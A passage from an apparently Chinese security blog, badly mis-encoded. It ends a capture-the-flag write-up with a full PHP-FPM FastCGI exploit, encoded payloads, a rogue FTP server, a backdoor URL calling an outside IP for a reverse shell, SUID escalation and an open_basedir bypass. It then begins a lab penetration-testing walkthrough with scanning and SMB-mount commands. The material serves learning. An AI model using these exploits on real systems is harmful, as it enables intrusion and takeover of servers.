&lt;&lt; 8); $nlen |= (ord($data{$p++})); } $vlen = ord($data{$p++}); if ($vlen &gt;= 128) { $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data{$p++}) &lt;&lt; 16); $vlen |= (ord($data{$p++}) &lt;&lt; 8); $vlen |= (ord($data{$p++})); } $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); } return $array; } /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) { $ret = array(); $ret['version'] = ord($data{0}); $ret['type'] = ord($data{1}); $ret['requestId'] = (ord($data{2}) &lt;&lt; 8) + ord($data{3}); $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5}); $ret['paddingLength'] = ord($data{6}); $ret['reserved'] = ord($data{7}); return $ret; } /** * Read a FastCGI Packet * * @return array */ private function readPacket() { if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) { $resp = $this-&gt;decodePacketHeader($packet); $resp['content'] = ''; if ($resp['contentLength']) { $len = $resp['contentLength']; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) { $len -= strlen($buf); $resp['content'] .= $buf; } } if ($resp['paddingLength']) { $buf=fread($this-&gt;_sock, $resp['paddingLength']); } return $resp; } else { return false; } } /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) { $this-&gt;connect(); $request = ''; foreach ($requestedInfo as $info) { $request .= $this-&gt;buildNvpair($info, ''); } fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp['type'] == self::GET_VALUES_RESULT) { return $this-&gt;readNvpair($resp['content'], $resp['length']); } else { throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT'); } } /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) { $response = ''; // $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = ''; foreach ($params as $key =&gt; $value) { $paramsRequest .= $this-&gt;buildNvpair($key, $value); } if ($paramsRequest) { $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); } $request .= $this-&gt;buildPacket(self::PARAMS, ''); if ($stdin) { $request .= $this-&gt;buildPacket(self::STDIN, $stdin); } $request .= $this-&gt;buildPacket(self::STDIN, ''); echo('data='.urlencode($request)); // fwrite($this-&gt;_sock, $request); // do { // $resp = $this-&gt;readPacket(); // if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) { // $response .= $resp['content']; // } // } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST); // var_dump($resp); // if (!is_array($resp)) { // throw new Exception('Bad request'); // } // switch (ord($resp['content']{4})) { // case self::CANT_MPX_CONN: // throw new Exception('This app can\\'t multiplex [CANT_MPX_CONN]'); // break; // case self::OVERLOADED: // throw new Exception('New request rejected; too busy [OVERLOADED]'); // break; // case self::UNKNOWN_ROLE: // throw new Exception('Role value not known [UNKNOWN_ROLE]'); // break; // case self::REQUEST_COMPLETE: // return $response; // } } } ?&gt; &lt;?php // real exploit start here //if (!isset($_REQUEST['cmd'])) { // die(\"Check your input \"); //} //if (!isset($_REQUEST['filepath'])) { // $filepath = __FILE__; //}else{ // $filepath = $_REQUEST['filepath']; //} $filepath = \"/var/www/html/add_api.php\"; // ç›®æ ‡ä¸»æœºå·²çŸ¥çš„PHPæ–‡ä»¶çš„è·¯å¾„ $req = '/'.basename($filepath); $uri = $req .'?'.'command=whoami'; // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡ $client = new FCGIClient(\"unix:///var/run/php-fpm.sock\", -1); $code = \"&lt;?php system(\\$_REQUEST['command']); phpinfo(); ?&gt;\"; // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡ $php_value = \"unserialize_callback_func = system extension_dir = /var/www/html extension = hpdoger.so disable_classes = disable_functions = allow_url_include = On open_basedir = / auto_prepend_file = \";//extension_dirå³ä¸º.soæ–‡ä»¶æ‰€åœ¨ç›®å½• $params = array( 'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0', 'REQUEST_METHOD' =&gt; 'POST', 'SCRIPT_FILENAME' =&gt; $filepath, 'SCRIPT_NAME' =&gt; $req, 'QUERY_STRING' =&gt; 'command=whoami', 'REQUEST_URI' =&gt; $uri, 'DOCUMENT_URI' =&gt; $req, #'DOCUMENT_ROOT' =&gt; '/', 'PHP_VALUE' =&gt; $php_value, 'SERVER_SOFTWARE' =&gt; '80sec/wofeiwo', 'REMOTE_ADDR' =&gt; '127.0.0.1', 'REMOTE_PORT' =&gt; '9001', //FastCGIå¼€å¯çš„æœåŠ¡ç«¯å£åœ° 'SERVER_ADDR' =&gt; '127.0.0.1', 'SERVER_PORT' =&gt; '80', 'SERVER_NAME' =&gt; 'localhost', 'SERVER_PROTOCOL' =&gt; 'HTTP/1.1', 'CONTENT_LENGTH' =&gt; strlen($code) ); // print_r($_REQUEST); // print_r($params); //echo \"Call: $uri \"; echo $client-&gt;request($params, $code).\" \"; ?&gt; é€šè¿‡åœ¨FastCGIåè®®ä¿®æ”¹PHP_VALUEå­—æ®µè¿›è€Œä¿®æ”¹php.iniä¸­çš„ä¸€äº›è®¾ç½®ï¼Œè€Œopen_basedir åŒæ ·å¯ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•è¿›è¡Œè®¾ç½®ã€‚æ¯”å¦‚ï¼š$php_value = \"open_basedir = /\"; å› ä¸ºFPMæ²¡æœ‰åˆ¤æ–­è¯·æ±‚çš„æ¥æºæ˜¯å¦å¿…é¡»æ¥è‡ªWebserverã€‚æ ¹æ®PHPè§£æå™¨çš„æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ FastCGIå‘FPMå‘èµ·è¯·æ±‚ï¼ŒPHP_VALUEç›¸å½“äºæ”¹å˜.iniä¸­çš„è®¾ç½®ï¼Œè¦†ç›–äº†æœ¬èº«çš„open_basedir ç¼–è¯‘å¾—åˆ°payload data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02H%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fww w%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.p hp%09%80%00%00%BCPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_func tions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT900 1%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 ç„¶åæ‰§è¡Œä»¥ä¸‹è„šæœ¬è‡ªå·± vps ä¸Šæ­å»ºä¸€ä¸ªæ¶æ„çš„ ftp æœåŠ¡å™¨ï¼š import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23)) s.listen(1) conn, addr = s.accept() conn.send(b'220 welcome ') #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b'331 Please specify the password. ') #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b'230 Login successful. ') #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b'200 Switching to Binary mode. ') #Size / conn.send(b'550 Could not get the file size. ') #EPSV (1) conn.send(b'150 ok ') #PASV conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001) ') #STOR / (2) conn.send(b'150 Permission denied. ') #QUIT conn.send(b'221 Goodbye. ') conn.close() éšååœ¨vpsä¸Šå¼€å¯ä¸Šè¿°ftpæœåŠ¡ï¼Œå¹¶ä¸”å¼€ä¸€ä¸ªç«¯å£è¿›è¡Œç›‘å¬ æœ€åç”¨ä¸€ä¸ªevalæ„é€ æ¶æ„ä»£ç file_put_contentsï¼Œä¸æˆ‘ä»¬çš„vpsçš„ftpå»ºç«‹è¿æ¥ /add_api.php?backdoor=$file=$_GET['file'];$data=$_GET['data'];file_put_contents($file,$data);&amp;file=ftp://aaa@124.220.233.26:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2F www%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api .php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+% 0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERV ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 å°†ä¸Šè¿°å†…å®¹å‘é€åå³å¯æˆåŠŸåå¼¹shell è¯»å–çš„æ—¶å€™å‘ç°æƒé™ä¸å¤Ÿï¼Œè¿™é‡Œéœ€è¦ææƒï¼Œè‡³äºåŸç†ä¸€ä¼šå„¿è®¨è®º åˆ©ç”¨suidææƒæ–¹å¼ï¼ŒæŸ¥çœ‹å…·æœ‰suidæƒé™çš„æ–‡ä»¶ï¼Œè¿™ä¸ªè¦ç­‰ä¸€ä¼šæ‰èƒ½å‡ºæ¥ã€‚ find / -perm -u=s -type f 2&gt;/dev/null è¿™é‡Œçœ‹åˆ°æœ‰PHPæƒé™ï¼Œç›´æ¥php -aè¿›å…¥äº¤äº’æ¨¡å¼è¯»å–ï¼Œä½†è¿™é‡Œå¦‚æœç›´æ¥è¯»å–flagçš„è¯è¿˜æ˜¯æœ‰open_basedirçš„é™åˆ¶ï¼Œå› æ­¤è¿˜éœ€è¦åˆ©ç”¨ä¸Šè¿°çš„æ–¹æ³•ç»•è¿‡ï¼Œè¿™é‡Œå†™æ–‡ä»¶æ¯”è¾ƒæ–¹ä¾¿ï¼Œä½†æˆ‘å°±ç›´æ¥è¾“å…¥äº†ã€‚ mkdir('gyy');chdir('gyy');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents(\"/flag\")); èšå‰‘æ’ä»¶ç»•è¿‡ è¿™é‡Œçœ‹åˆ°æœ‰ä¸ªwpè¯´åˆ©ç”¨èšå‰‘çš„æ’ä»¶å¯ä»¥ç›´æ¥æ¢­å“ˆäº†ï¼Œå­¦ä¸€æ³¢ï¼Œå¤§æ¦‚å°±æ˜¯ä¿®æ”¹ä¸€ä¸‹èšå‰‘çš„æ’ä»¶ï¼Œçœå»vpsæ‰“è„šæœ¬çš„è¿‡ç¨‹ã€‚èšå‰‘é‡Œæœ‰é€šè¿‡æ”»å‡» PHP-FPM ç»•è¿‡ Disable_Functions çš„æ’ä»¶ï¼Œè‡ªè¡Œå»å•†åº—ä¸‹è½½å³å¯ ä½†æ˜¯è¿™é‡Œéœ€è¦å¯¹æ’ä»¶è¿›è¡Œä¿®æ”¹ æ’ä»¶ä¸­çš„payloadä½¿ç”¨äº†fsockopen()ï¼Œä½†æ˜¯fsockopen()è¢«banäº†ï¼Œå¹¶ä¸”å¹¶ä¸”èšå‰‘çš„æ’ä»¶ä¸­æ²¡æœ‰ PHP-FPM åœ°å€ä¸º 127.0.0.1:9001 çš„é€‰é¡¹ã€‚ä½†æ˜¯pfsockopen()æ²¡æœ‰è¢«ban è€Œä¸”ä¸¤è€…æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œå°†è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸‹çš„fsockopen()æ”¹æˆpfsockopen() ä½†æ˜¯æ²¡ç©æ‡‚ï¼Œè·Ÿç€åšä¹Ÿä¸è¡Œï¼Œæ„Ÿå…´è¶£çš„è‡ªå·±å‚è€ƒæ–‡ç« å§ï¼š[2021 è“å¸½æ¯]one_Pointer_php å¤ç° 0x05 æ€»ç»“ è¿™é‡Œåœ¨å›é¡¾æ•´ç†ä¸Šè¿°æ”»å‡»çš„æ€è·¯ï¼šé¦–å…ˆå°±æ˜¯å¯¹äºPHPæ•°ç»„çš„æº¢å‡ºç»•è¿‡ï¼Œä¹‹åå‘ç°å¯ä»¥å†™æœ¨é©¬äº†ï¼Œèšå‰‘è¿æ¥å‘ç°æƒé™ä¸å¤Ÿï¼Œå› æ­¤è¦æƒ³ç€æ‹¿shellï¼Œå»è¿›ä¸€æ­¥çš„ææƒï¼Œæ¥ç€å‘ç°äº†open_basedirçš„é™åˆ¶ä»¥åŠFastCGIæœåŠ¡å¼€å¯äº†ã€‚ äºæ˜¯æˆ‘ä»¬æƒ³ç€ç»•è¿‡open_basediræ¥è¯»å–FastCGIç›¸å…³é…ç½®ä¿¡æ¯ï¼ˆå› ä¸ºfile_put_contentså‡½æ•°æ²¡æœ‰ç¦ç”¨ï¼Œå®Œå…¨å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥ssrf+ftpæ¥æ‰“ï¼‰ï¼Œæœ€åæˆåŠŸè¯»å–åˆ°äº†å¼€å¯çš„ç«¯å£ä¸º9001ï¼Œä½†æˆ‘ä»¬å¦‚ä½•æ‰èƒ½åå¼¹shellå‘¢ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åˆçœ‹åˆ°äº†ä¸€ä¸ªæ‹“å±•extensionï¼Œè¿™é‡Œç«Ÿç„¶å…è®¸åŠ è½½.soæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å°±èƒ½æ„é€ æ¶æ„çš„.soæ–‡ä»¶æ¥æ‹¿shellã€‚ ä½†ç›®å‰ä¸ºæ­¢æˆ‘ä»¬åªèƒ½åœ¨htmlç›®å½•ä¸‹è¯»å†™ï¼Œä¸”æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œé‚£å¦‚ä½•è®©é¶æœºæ‰§è¡Œæˆ‘ä»¬çš„.soæ–‡ä»¶å‘¢ï¼Œè¿™æ—¶å€™å°±æƒ³åˆ°ftpçš„ä½œç”¨äº†ã€‚é¦–å…ˆæˆ‘ä»¬æ„é€ FastCGIçš„è¯·æ±‚PHP-CGIï¼Œé€šè¿‡å¯¹å…¶ä¸­çš„æŸäº›ä¿¡æ¯çš„ä¿®æ”¹ï¼ˆä¿®æ”¹ä¸º9001ç«¯å£ï¼Œè¿™é‡Œç”¨äºè®©é¶æœºè‡ªå·±è®¿é—®è‡ªå·±çš„9001ç«¯å£ï¼Œç„¶ååœ¨å…¶ä¸­è¿˜è¦å†™æ˜å¾…åŠ è½½çš„æ¶æ„.soæ–‡ä»¶ç›®å½•ä»¥åŠè¦†ç›–open_basedirä¸ºæ ¹ç›®å½•ï¼‰ã€‚ è¿™é‡Œå°±ç›¸å½“äºæˆ‘ä»¬å†™çš„FastCGIåè®®çš„å†…å®¹å°±æ˜¯æ¶æ„ä»£ç ï¼Œä¹‹åæˆ‘ä»¬å¼€å¯äº†ftpæœåŠ¡ï¼Œå¹¶ä¸”è®©é¶æœºè®¿é—®äº†æˆ‘ä»¬çš„ftpæœåŠ¡ï¼Œè®¿é—®ä¹‹åæˆ‘ä»¬çš„ftpæœåŠ¡å™¨ä¼šè®©é¶æœºè¯»å–æˆ‘ä»¬æŒ‡å®šçš„ipå’Œç«¯å£ï¼ˆ127.0.0.1å’Œ9001ï¼‰ï¼Œè¿™æ ·çš„è¯ä»–å®é™…ä¸Šå°±æ˜¯å»è¯»å–æˆ–å†™å…¥åˆ°è‡ªå·±æœåŠ¡å™¨ä¸Š9001çš„å†…å®¹ï¼ŒåŒæ—¶æˆ‘ä»¬å‘é€ä¸Šè¿°å¾—åˆ°çš„FastCGIåè®®çš„æ¶æ„ä»£ç ï¼Œè¿™æ®µä»£ç åœ¨file_put_contentså‡½æ•°çš„ä½œç”¨ä¸‹å°±ä¼ åˆ°äº†ç«¯å£9001ä¸­ï¼Œä¹Ÿå°±æ˜¯fpmæ¥å—åˆ°äº†ä¸€ä¸ªäºŒè¿›åˆ¶æ•°æ®æµï¼Œéšåè¯¥fpmå°±ä¼šæ‰§è¡Œè¿™æ®µæ•°æ®ï¼Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ä¹Ÿå°±æˆåŠŸè¢«æ‰§è¡Œï¼Œæ‹¿åˆ°shell åœ¨å­¦äº†ä¸Šè¿°çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥è¿˜æœ‰ä¸€äº›ä¸æ‡‚å¾—ç‚¹ï¼Œopen_basedirçš„ç»•è¿‡éœ€è¦æ€»ç»“ä¸€æ‰‹ï¼Œsuidææƒå¤ä¹ ä¸€æ‰‹ï¼Œextension=xx.soä¸å¤ªæ‡‚ï¼Œret=127ä¸ç†è§£ï¼Œæ¥ä¸‹æ¥å°±å†å†™ä¸€ç¯‡æ–‡ç« æ¥è§£å†³ï¼ï¼ï¼ 0x06 å‚è€ƒæ–‡ç«  ubuntuä¸‹nginx+PHP-FPMå®‰è£… Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™ Fastcgi åè®®åˆ†æä¸ PHP-FPM æ”»å‡»æ–¹æ³• SSRFç³»åˆ—ä¹‹æ”»å‡»FastCGI åˆ©ç”¨SSRFæ”»å‡»å†…ç½‘FastCGIåè®® é™‡åŸæˆ˜â€œç–«â€œ2021ç½‘ç»œå®‰å…¨å¤§èµ› Web eaaasyphp é™‡åŸæˆ˜ç–«2021ç½‘ç»œå®‰å…¨å¤§èµ› wooyun-2014-071540 PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶ è“å¸½æ¯One_Pointer_PHPå¤ç°æ€»ç»“ è“å¸½æ¯2021 One Pointer PHP è“å¸½æ¯2021ä¸€é“é¢˜â€”â€”One_Pointer_PHP ä»PHPåº•å±‚çœ‹open_basedir bypass","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"å¸¸è§æ¸—é€æµ‹è¯•æµç¨‹","path":"/2023/12/19/chang-jian-shen-tou-ce-shi-liu-cheng/","content":"0x01 å‰è¨€ æœ€è¿‘åˆ·å…¬ä¼—å·çœ‹åˆ°ä¸€ä½å¸ˆå‚…å‘äº†ä¸ªåŸºæœ¬çš„æ¸—é€æµ‹è¯•æµç¨‹ï¼Œæˆ‘æ„Ÿè§‰åˆšå¥½æœ‰åˆ©äºæˆ‘è¿™ä¸ªå°ç™½å­¦ä¹ ä¸€æ³¢ï¼Œæ¯•ç«Ÿä¹‹å‰è™½ç„¶åˆ·äº†å‡ ä¸ªç®€å•é¶åœºï¼Œä½†å¯¹äºæµ‹è¯•æµç¨‹è¿˜æ˜¯å¾ˆæ¨¡ç³Šï¼Œå€Ÿæ­¤æ–‡ç« æ¥æµ…æµ…å­¦ä¹ ä¸€ä¸‹ï¼Œè®©è‡ªå·±ä»¥ååˆ·é¶åœºä¹Ÿä¸è‡³äºç‰¹åˆ«ç›²ç›®ã€‚ 0x02 ä¿¡æ¯æœé›† å°†è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾ç½®ä¸ºNATä¸ä¸»æœºå…±äº«åœ°å€ã€‚ä¿è¯å’Œkaliå¤„äºåŒä¸€ç½‘æ®µã€‚æˆ‘ä»¬å¯åŠ¨é¶æœºï¼Œæ¥ç€ç¬¬ä¸€æ­¥è·å–ç›®æ ‡ipåœ°å€ 2.1 è·å–IPåœ°å€ ç°åœ¨æˆ‘ä»¬éœ€è¦çŸ¥é“ç›®æ ‡ä¸»æœºçš„IPåœ°å€ã€‚æˆ‘ä»¬åœ¨kaliä¸­ç”¨netdiscoverå·¥å…·æ‰«æå³å¯ã€‚ netdiscover -i eth0 -r 192.168.246.1/24 è¿™é‡Œå‘¢æˆ‘ä»¬çš„kaliåœ°å€ä¸º192.168.246.254ï¼Œé‚£å¾ˆæ˜æ˜¾å°±æ˜¯ç¬¬ä¸‰ä¸ª192.168.246.136äº†ï¼Œæ¥ç€æˆ‘ä»¬è¿›è¡Œç«¯å£æ‰«æ 2.2 ç«¯å£æ‰«æ åœ¨ä¸Šä¸€æ­¥ä¸­æˆ‘ä»¬è·å–äº†é¶æœºåœ°å€ï¼Œé‚£æ¥ä¸‹æ¥å°±åº”è¯¥çœ‹é¶æœºå¼€å¯äº†é‚£äº›ç«¯å£å¯ä»¥è®©æˆ‘ä»¬è¿›è¡Œè¿›ä¸€æ­¥åˆ©ç”¨ nmap -T4 -A 192.168.246.136 éƒ¨åˆ†å‚æ•°è§£é‡Šï¼š -T&lt;0-5&gt;: è°ƒæ•´æ‰«æé€Ÿåº¦ï¼Œ0-5 6ä¸ªçº§åˆ«ï¼Œç»å¸¸ä½¿ç”¨4 -Aï¼šä¸€æ¬¡æ‰«æåŒ…å«ç³»ç»Ÿæ¢æµ‹ã€ç‰ˆæœ¬æ¢æµ‹ã€è„šæœ¬æ‰«æå’Œè·Ÿè¸ªæ‰«æ --ä¹Ÿå°±æ˜¯æ‰«æçš„å¾ˆå…¨é¢ ç”±ä¸Šå›¾æˆ‘ä»¬çœ‹åˆ°é¶æœºåœ°å€å¼€å¯çš„ç«¯å£æœ‰ï¼š 22ã€80ã€139ã€445ã€3306ã€6667 å¼€å¯äº†sshã€httpã€æ–‡ä»¶å…±äº«ï¼ˆå¯èƒ½ï¼‰ã€MySQLæœåŠ¡ç­‰ å½“ç„¶è¿™é‡Œä¿¡æ¯æœé›†è‚¯å®šä¸æ­¢è¿™äº›ï¼Œä½†è¿™ä¸ªé¶æœºç®€å•ï¼Œä¹Ÿå°±è¿™ä¹ˆå¤šå°±è¡Œã€‚åç»­è‚¯å®šä¼šå­¦åˆ°æ›´å¤š 0x03 æ¸—é€æµ‹è¯• 3.1 å¯¹Webç«™ç‚¹æµ‹è¯• æˆ‘ä»¬è®¿é—®ä¸€æ‰‹é¶æœºIPåœ°å€ï¼Œå¦‚ä¸‹å›¾æ˜¯ä¸€ä¸ªWebç«™ç‚¹ æ‰«æç«™ç‚¹ç›®å½•ï¼Œçœ‹æ˜¯å¦å­˜åœ¨æ•æ„Ÿæ–‡ä»¶ dirsearch -u \"http://192.168.246.136/\" #æˆ–è€…ä¸€èˆ¬ä¼šé‡‡ç”¨å¤šä¸ªå‘½ä»¤æ¥æ‰«æç›®å½•ï¼Œå¯ä»¥é…åˆå¦‚ä¸‹å‘½ä»¤ dirb http://192.168.246.136/ å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•æ„Ÿç›®å½•è¿˜æ˜¯å¾ˆå¤šçš„ï¼šinfo.phpã€phpmyadminã€wpç­‰ è¿™é‡Œçœ‹é‚£ä½å¸ˆå‚…çœ‹åˆ°æ˜¯wpç¨‹åºï¼Œç›´æ¥é‡‡ç”¨äº†wpscanç¥å™¨ wpscan --url http://192.168.246.136/ ä½†é—æ†¾çš„æ˜¯æ²¡æœ‰ç»“æœï¼Œçœ‹äº†æ–‡ç« å‘ç°tmå‘½ä»¤é”™äº†ï¼Œæˆ‘ä»¥ä¸ºä»–ç›´æ¥å°±èƒ½è¯†åˆ«åˆ°wordpressçš„ï¼Œæƒ³ä¸åˆ°è¿˜å¾—æ‰‹åŠ¨åŠ ä¸€ä¸‹ wpscan --url http://192.168.246.136/wordpress è¿™é‡Œå¯ä»¥å‘ç°ä¸€äº›å…³äºwpç¨‹åºçš„ä¿¡æ¯ï¼Œä½†å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œè¿™é‡Œè¯´æ˜¯æœ‰wpscançš„apiçš„è¯ï¼Œå¯ä»¥æ‰«å‡ºæ¼æ´ï¼Œä½†æˆ‘å»æ³¨å†Œé‡åˆ°äº†é—®é¢˜å°±å…ˆä¸è®¾ç½®äº†ã€‚å·¥å…·çš„å…·ä½“ç”¨æ³•å‚è€ƒå¦‚ä¸‹ï¼š é’ˆå¯¹åšå®¢ç½‘ç«™çš„æ‰«æç¥å™¨Wpscanå…¥é—¨ä½¿ç”¨æŒ‡å— wpscanä½¿ç”¨æ•™ç¨‹ 3.2 SambaæœåŠ¡ åœ¨åˆšæ‰çš„æ‰«æä¸­ï¼Œç›®æ ‡å¼€å¯äº†445ç«¯å£ï¼Œè¿™æ„å‘³ç€å¯èƒ½å­˜åœ¨æ–‡ä»¶å…±äº«æœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨enum4linuxæšä¸¾è¿è¡ŒSambaçš„ä¸»æœºã€‚å‘½ä»¤å¦‚ä¸‹ï¼š enum4linux 192.168.246.136 è¿™ä¸ªå·¥å…·çš„å…·ä½“ç”¨æ³•å¯å‚è€ƒï¼š Kali Linuxä¿¡æ¯æ”¶é›†ä¹‹enum4linux Kali ä¿¡æ¯æ”¶é›†ä¹‹enum4linux ä½¿ç”¨æ•™ç¨‹ è¿™é‡Œè¯´ä¸€ä¸‹è¯¥å·¥å…·çš„ä¸»è¦åŠŸèƒ½ï¼Œå¯æ£€æµ‹å¦‚ä¸‹ä¿¡æ¯ï¼š RIDå¾ªç¯ï¼ˆå½“Windows 2000ä¸Šçš„RestrictAnonymousè®¾ç½®ä¸º1æ—¶ï¼‰ ç”¨æˆ·åˆ—è¡¨ï¼ˆå½“Windows 2000ä¸Šçš„RestrictAnonymousè®¾ç½®ä¸º0æ—¶ï¼‰ ç»„æˆå‘˜ä¿¡æ¯åˆ—è¡¨ å…±äº«æšä¸¾ æ£€æµ‹ä¸»æœºæ˜¯å¦åœ¨å·¥ä½œç»„æˆ–åŸŸä¸­ è¯†åˆ«è¿œç¨‹æ“ä½œç³»ç»Ÿ å¯†ç ç­–ç•¥æ£€ç´¢ï¼ˆä½¿ç”¨polenumï¼‰ ç¿»çœ‹äº†ä¸€ä¸‹å‘ç°è¿™é‡Œç”¨æˆ·åå’Œå¯†ç æ˜¯ç©ºçš„ï¼Œè¿˜æœ‰ä¸‹å›¾çš„ä¸€äº›SIDï¼Œä½†ä¸æ¸…æ¥šä½œç”¨ è¿™é‡Œé‚£ä½å¸ˆå‚…ç›´æ¥å°±æŒ‚è½½ç›®å½•åˆ°æœ¬åœ°äº†ï¼Œè¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯ç”±äºé¶æœºå¼€å¯äº†æ–‡ä»¶å…±äº«æœåŠ¡ï¼Œé‚£æˆ‘ä»¬å®Œå…¨å¯ä»¥ä¸»åŠ¨è¿æ¥å¯¹æ–¹ï¼Œå¹¶é€‰æ‹©æŒ‚è½½ç›¸åº”çš„ç›®å½•åˆ°æœ¬åœ°ã€‚â€“ç”±äºé¶æœºçš„ç”¨æˆ·åå’Œå¯†ç æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä»»æ„è¿æ¥ mount -t cifs -o username=â€™â€™,password=â€™â€™ //192.168.246.136/share$ /mnt æŒ‚è½½windowså…±äº«ç›®å½• #æŒ‚è½½çš„æ—¶å€™è¦åŠ ä¸Š-tå‚æ•°æŒ‡å®šç±»å‹ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨rootç”¨æˆ·æŒ‚è½½ï¼Œå¦‚æœæŒ‚è½½åæ™®é€šç”¨æˆ·éœ€è¦å†™å…¥ï¼Œéœ€è¦æŒ‡å®šfile_mode=0777,dir_mode=0777ï¼Œå¦åˆ™åªæœ‰rootç”¨æˆ·å¯ä»¥å†™å…¥ï¼Œæ™®é€šç”¨æˆ·åªè¯»ã€‚ root@vanfonuat:/# mount -t cifs -o user=everyone,file_mode=0777,dir_mode=0777 //192.168.0.8/SHARE /sharedata Password for everyone@//192.168.0.8/SHARE: ä½†è¿™é‡Œç–‘æƒ‘çš„æ˜¯ä»–å¦‚ä½•åˆ¤æ–­å‡ºå¯¹æ–¹æ˜¯windowsç³»ç»Ÿçš„ï¼Œè¿™é‡Œæ‰¾äº†å‡ ä¸ªæ–‡ç« 